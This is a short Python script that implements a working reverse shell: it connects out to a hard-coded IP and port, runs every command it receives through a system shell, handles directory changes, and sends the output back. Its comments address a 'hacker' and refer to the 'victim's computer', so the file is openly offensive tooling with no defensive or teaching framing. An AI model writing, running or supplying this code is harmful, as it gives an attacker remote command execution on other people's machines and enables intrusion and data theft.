import socket
import os
import subprocess

s = socket.socket()
# host(below) contains the ip of server (or if server is not created it contains ip of local hackers computer)
# ip of servers is dynamic so we don't have to worry about the dynamic ip of our laptop
host = '192.168.29.12'
port = 9989

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        # this print will print the output into victims computer screen...so if you are a  hacker skip this print
        print(output_str)
